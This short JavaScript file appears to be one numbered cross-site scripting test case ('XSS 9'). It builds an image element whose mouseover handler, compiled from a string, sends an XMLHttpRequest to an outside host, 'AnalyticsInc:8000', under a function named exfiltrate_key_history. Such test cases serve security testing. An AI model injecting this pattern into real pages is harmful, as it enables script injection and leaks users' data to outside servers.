function exfiltrate_key_history() {

    // XSS 9 - IMG No SRC with Event - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var script = document.createElement("img");
    script.onmouseover = Function('xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","http://AnalyticsInc:8000/submission.html?test=xss9",true);xmlhttp.send(null);');
	script.height = '50';
	script.width = '50';
	script.alt = 'image';
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;